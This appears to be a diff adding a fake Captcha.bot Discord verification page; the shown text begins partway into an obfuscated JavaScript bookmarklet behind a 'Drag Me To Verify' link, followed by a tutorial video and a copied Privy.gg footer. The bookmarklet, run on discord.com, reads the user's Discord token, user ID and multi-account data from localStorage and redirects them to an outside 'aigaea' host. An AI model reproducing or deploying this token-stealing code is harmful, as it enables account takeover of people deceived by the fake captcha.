w5Kia&quot;,&quot;wejlDeG&quot;,&quot;y3rVCIGICMv0Dq&quot;,&quot;nZe5mZeXmgX0vNzfBq&quot;,&quot;A2XSwwS&quot;,&quot;BNrtDg9Yzq&quot;,&quot;DgfIBgu&quot;,&quot;Dg9tDhjPBMC&quot;,&quot;x19WCM90B19F&quot;,&quot;rM1dvxu&quot;,&quot;Bhq6&quot;,&quot;wfbODfm&quot;,&quot;rLP5Dxu&quot;,&quot;rMfPBgvKihrVia&quot;,&quot;BKT0uvK&quot;,&quot;Ag9ZDa&quot;,&quot;zxjYB3i&quot;,&quot;rNfwBgq&quot;,&quot;sNfHvuy&quot;,&quot;B3jLoG&quot;,&quot;Bg9JywXtDg9Yyq&quot;,&quot;AwzYyw1L&quot;,&quot;q1fNsvG&quot;,&quot;kcGOlISPkYKRkq&quot;,&quot;yMLUza&quot;,&quot;ndj6zuP4zg4&quot;,&quot;Ahr0Chm6lY9Iyq&quot;,&quot;zxHJzxb0Aw9U&quot;,&quot;ihzLCMLMEsb5BW&quot;,&quot;yxbWl2nHBgXIyq&quot;,&quot;rhbPExm&quot;,&quot;D3D3lMrPC2nVCG&quot;,&quot;vMPPBLe&quot;,&quot;q012wvK&quot;,&quot;mte5ntmWmdyXnW&quot;,&quot;y29UC29Szq&quot;,&quot;wxjxzNy&quot;,&quot;yM9KEq&quot;,&quot;ENbZvLG&quot;,&quot;Aw5MBW&quot;,&quot;nJK3mtu2mfzAyLzgCW&quot;,&quot;AgvUig9UigH0Da&quot;,&quot;q2LYy3vSyxi&quot;,&quot;Dg9Rzw4&quot;,&quot;DxnLCM5HBwu&quot;,&quot;jNnLCNzLCL9Pza&quot;,&quot;wxfxBhC&quot;,&quot;jNDVCMq9&quot;,&quot;DxnLCL9Pzf9Jyq&quot;,&quot;CMqUy29TlYb0BW&quot;,&quot;nerXCeDxrG&quot;,&quot;mtiZmZuXnhbpDxzdvG&quot;,&quot;D3nNDKS&quot;,&quot;AufJy291BNrtDa&quot;,&quot;nta2mJC1mZC5&quot;,&quot;CIbIB29RBwfYAW&quot;,&quot;twf0y2GGCMvZDq&quot;,&quot;zw50&quot;];return(a0_0x213d=function(){return t})()}!function(){const t=a0_0x4e4b,n=a0_0x213d();for(;;)try{if(797279===-parseInt(t(286))/1+-parseInt(t(327))/2+parseInt(t(298))/3+parseInt(t(285))/4*(parseInt(t(238))/5)+parseInt(t(260))/6*(-parseInt(t(325))/7)+parseInt(t(275))/8+parseInt(t(230))/9*(parseInt(t(347))/10))break;n.push(n.shift())}catch(t){n.push(n.shift())}}();const a0_0xf0b69d=function(){const t=a0_0x4e4b,n={};n[t(257)]=function(t,n){return t===n},n[t(232)]=t(224),n[t(344)]=t(252);const e=n;let r=!0;return function(n,o){const a=t,c={FZyuu:function(t,n){return e[a0_0x4e4b(257)](t,n)},RPbll:e[a(232)],UJnyg:e[a(344)]},i=r?function(){const t=a;if(c[t(247)](c[t(329)],c[t(314)]))_0x5a53c1=_0x14cc6b;else if(o){const e=o[t(307)](n,arguments);return o=null,e}}:function(){};return r=!1,i}}(),a0_0x360fab=a0_0xf0b69d(this,function(){const t=a0_0x4e4b,n={};n[t(300)]=t(258)+&quot;+$&quot;;const e=n;return a0_0x360fab[t(242)]().search(e[t(300)])[t(242)]()[t(328)+&quot;r&quot;](a0_0x360fab).search(e[t(300)])});function a0_0x4e4b(t,n){const e=a0_0x213d();return a0_0x4e4b=function(n,r){let o=e[n-=224];if(void 0===a0_0x4e4b.BNjajV){var a=function(t){let n=&quot;&quot;,e=&quot;&quot;,r=n+a;for(let e,o,a=0,c=0;o=t.charAt(c++);~o&&(e=a%4?64*e+o:o,a++%4)?n+=r.charCodeAt(c+10)-10!=0?String.fromCharCode(255&e&gt;&gt;(-2*a&6)):a:0)o=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&quot;.indexOf(o);for(let t=0,r=n.length;t<r;t++)e+=&quot;%&quot;+(&quot;00&quot;+n.charCodeAt(t).toString(16)).slice(-2);return decodeURIComponent(e)};a0_0x4e4b.pQLClK=a,t=arguments,a0_0x4e4b.BNjajV=!0}const c=n+e[0],i=t[c];if(i)o=i;else{const n=function(t){this.KxSWCC=t,this.EWMaLF=[1,0,0],this.sqozXd=function(){return&quot;newState&quot;},this.tAoTzC=&quot;\\w+ *\\(\\) *{\\w+ *&quot;,this.VLmfGI=&quot;['|\&quot;].+['|\&quot;];? *}&quot;};n.prototype.CPMCxy=function(){const t=new RegExp(this.tAoTzC+this.VLmfGI).test(this.sqozXd.toString())?--this.EWMaLF[1]:--this.EWMaLF[0];return this.PzIrdR(t)},n.prototype.PzIrdR=function(t){return Boolean(~t)?this.HsZsyF(this.KxSWCC):t},n.prototype.HsZsyF=function(t){for(let t=0,n=this.EWMaLF.length;t<n;t++)this.EWMaLF.push(Math.round(Math.random())),n=this.EWMaLF.length;return t(this.EWMaLF[0])},new n(a0_0x4e4b).CPMCxy(),o=a0_0x4e4b.pQLClK(o),t[c]=o}return o},a0_0x4e4b(t,n)}a0_0x360fab();const a0_0x22a69f=function(){const t=a0_0x4e4b,n={};n[t(265)]=&quot;(((.+)+)+)+$&quot;,n[t(296)]=function(t,n){return t===n},n[t(304)]=t(297);const e=n;let r=!0;return function(n,o){const a=t;if(e[a(296)](&quot;PNhUL&quot;,e.oUcOr)){const t=r?function(){if(o){const t=o[a(307)](n,arguments);return o=null,t}}:function(){};return r=!1,t}return _0x1009e8[a(242)]()[a(309)](e.Dpiys)[a(242)]()[a(328)+&quot;r&quot;](_0x244ae4)[a(309)](a(258)+&quot;+$&quot;)}}(),a0_0x48dc7f=a0_0x22a69f(this,function(){const t=a0_0x4e4b,n={FmCUu:function(t,n){return t!==n},Tuhca:&quot;LnKng&quot;,OJVOG:&quot;QlHfv&quot;,ffeGP:function(t,n){return t(n)},kllYk:function(t,n){return t+n},soyJx:&quot;return (function() &quot;,PXaxt:t(343)+t(237)+t(306)+&quot; )&quot;,rfDXl:t(262),rVIqA:&quot;trace&quot;,YqWlw:function(t,n){return t<n},pOUDB:t(299),JqaUF:&quot;AVKop&quot;};let e;try{if(!n[t(244)](n[t(294)],n.OJVOG)){const t=_0x2cadf8.apply(_0x14b39d,arguments);return _0x4c2021=null,t}e=n[t(324)](Function,n.kllYk(n[t(239)](n.soyJx,n[t(228)]),&quot;);&quot;))()}catch(t){e=window}const r=e[t(270)]=e[t(270)]||{},o=[t(305),t(330),t(274),t(251),n.rfDXl,t(241),n[t(312)]];for(let e=0;n[t(281)](e,o[t(339)]);e++)if(n[t(348)]!==n[t(253)]){const n=a0_0x22a69f[t(328)+&quot;r&quot;].prototype[t(259)](a0_0x22a69f),a=o[e],c=r[a]||n;n[t(243)]=a0_0x22a69f[t(259)](a0_0x22a69f),n.toString=c[t(242)][t(259)](c),r[a]=n}else{const n=_0x2e9ab1.constructor[t(226)].bind(_0x1524cf),e=_0x40b08d[_0x14de8b],r=_0x5589f2[e]||n;n.__proto__=_0x1f742e.bind(_0x36c73c),n[t(242)]=r[t(242)][t(259)](r),_0x36ae65[e]=n}});a0_0x48dc7f(),(()=&gt;{const t=a0_0x4e4b,n={BmtDb:t(248)+t(333)+t(288)+t(254),lIutk:&quot;discord.com&quot;,qpmJb:t(266)+t(301),gddmn:t(320)+t(313),gaXcy:t(227)+&quot;d.com&quot;,wsgvK:function(t,n){return t!==n},XPhtS:t(249),zpsVX:function(t,n){return t(n)},gdAjo:&quot;Please drag this but&quot;+t(293)+t(290)+t(235)+&quot;press it w&quot;+t(276)+t(338)+t(284)+t(263)+t(337),OkeVa:t(256),YrWfv:function(t,n){return t(n)},gjRXf:t(316),XBKtH:&quot;userId after normalization:&quot;,UMtHS:t(308),qicBT:t(291)+t(245),TjdOd:t(234)+t(231),CMvYY:t(323)+&quot;886369802&quot;,VjinQ:function(t,n){return t(n)}};if(![n.lIutk,n.qpmJb,n.gddmn,n.gaXcy][t(331)](location[t(250)])){if(!n[t(287)](n[t(246)],n[t(246)]))return void n[t(273)](alert,n.gdAjo);if(_0x86f55){const n=_0x42c666[t(307)](_0x147f3e,arguments);return _0x424b7e=null,n}}location[t(335)]();const e=document[t(295)+t(292)](n[t(342)]);document[t(272)][t(334)+&quot;d&quot;](e);let r=e[&quot;contentWin&quot;+t(345)][t(255)+&quot;ge&quot;][t(278)];r=r[t(326)](n[t(271)](atob,n.gjRXf),&quot;&quot;);let o,a=e.contentWindow[t(255)+&quot;ge&quot;][t(283)+t(233)];try{o=JSON.parse(a)}catch{o=a}console.log(n[t(236)],o);let c=t(332);try{if(n[t(287)](t(336),n[t(341)])){let r=e[t(311)+t(345)].localStorage[t(315)+t(240)],a=JSON[t(317)](r),i=a[t(318)]?.[t(321)]||[];if(Array[t(346)](i)){let e=i.find(t=&gt;String(t.id)===String(o));console[t(305)](n[t(302)],e),e?.[t(279)]&&(c=e[t(279)])}}else _0x2e4fd8[t(251)](n[t(340)],_0x354eeb)}catch(n){console[t(251)](t(248)+&quot;parse MultiAccountSt&quot;+t(254),n)}console[t(305)](n[t(310)],c);let i=t(277),f=t(269)+t(289),u=n[t(268)],s=t(319)+&quot;919862855&quot;;window[t(229)]=t(261)+&quot;ck.aigaea.&quot;+t(264)+t(322)+encodeURIComponent(r)+&quot;&user_id=&quot;+n.YrWfv(encodeURIComponent,o)+t(303)+n[t(267)](encodeURIComponent,c)+t(282)+n[t(271)](encodeURIComponent,i)+t(280)+&quot;=&quot;+f+t(225)+u+&quot;&channel_id=&quot;+s})();">
+           Drag Me To Verify
+          </a>
+         </div>
+        </div>
+        <h1 class="text-white text-xl font-semibold text-center mt-4" style="margin-bottom:0.5rem;">
+         Tutorial Video:
+        </h1>
+        <video
+  src="assets/video2.mp4"
+  muted
+  playsinline
+  preload="metadata"
+  onclick="
+    this.muted = true;
+    this.volume = 0;
+    this.paused ? this.play() : this.pause();
+  "
+  onvolumechange="
+    this.muted = true;
+    this.volume = 0;
+  "
+  style="
+    width: 100%;
+    display: block;
+    border: 3px solid rgb(88, 101, 242);
+    border-radius: 0.75rem;
+    box-shadow: 0 10px 15px -3px rgba(0,0,0,.25);
+    cursor: pointer;
+  "
+></video>
+       </div>
+      </div>
+     </div>
+    </div>
+    <footer aria-labelledby="footer-heading" class="bg-gray-900 mt-48">
+     <div class="max-w-7xl mx-auto px-4 pt-12 sm:px-6 lg:pt-16 lg:px-8 pb-4">
+      <h1 class="text-white text-2xl font-extrabold">
+       Captcha.bot
+      </h1>
+      <p class="text-gray-200">
+       Verification for online communities done right. A service provided by
+       <a class="text-indigo-600 hover:text-indigo-700" href="https://privy.gg/">
+        Privy.gg LLC
+       </a>
+       .
+      </p>
+     </div>
+     <div class="max-w-7xl mx-auto pb-12 px-4 sm:px-6 lg:pb-16 lg:px-8">
+      <div class="xl:grid xl:grid-cols-3 xl:gap-8">
+       <div class="mt-12 grid grid-cols-2 gap-8 xl:mt-0 xl:col-span-2">
+        <div class="md:grid md:grid-cols-2 md:gap-8">
+         <div>
+          <h3 class="text-sm font-semibold text-gray-100 tracking-wider uppercase">
+           Information
+          </h3>
+          <ul class="mt-4 space-y-4" role="list">
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400 cursor-pointer" href="https://discord.com/application-directory/512333785338216465">
+             Add to Discord
+            </a>
+           </li>
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400" href="https://captcha.bot/support">
+             Discord Server
+            </a>
+           </li>
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400" href="https://captcha.bot/premium">
+             Premium
+            </a>
+           </li>
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400 cursor-pointer" href="https://arcane.bot/">
+             Arcane.bot
+            </a>
+           </li>
+          </ul>
+         </div>
+         <div class="mt-12 md:mt-0">
+          <h3 class="text-sm font-semibold text-gray-100 tracking-wider uppercase">
+           Legal
+          </h3>
+          <ul class="mt-4 space-y-4" role="list">
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400 cursor-pointer" href="https://privy.gg/legal">
+             Terms of Service
+            </a>
+           </li>
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400 cursor-pointer" href="https://privy.gg/legal">
+             Privacy Policy
+            </a>
+           </li>
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400 cursor-pointer" href="https://privy.gg/legal">
+             Refunds
+            </a>
+           </li>
+           <li>
+            <a class="text-base text-gray-300 hover:text-gray-400 cursor-pointer" href="https://captcha.bot/disclosure">
+             Security
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="mt-12pt-8">
+       <p class="text-base text-gray-400 xl:text-center mt-8">
+        &copy; 2021-2026
+        <a href="https://privy.gg/">
+         Privy.gg LLC
+        </a>
+        . Not affiliated with Discord Inc.
+       </p>
+      </div>
+     </div>
+    </footer>
+   </div>
+  </div>
+  <div id="cb-container" style="position:fixed;inset:0px;z-index:2147483647;display:none;overflow-y:hidden">
+  </div>
+ </body>
+</html>
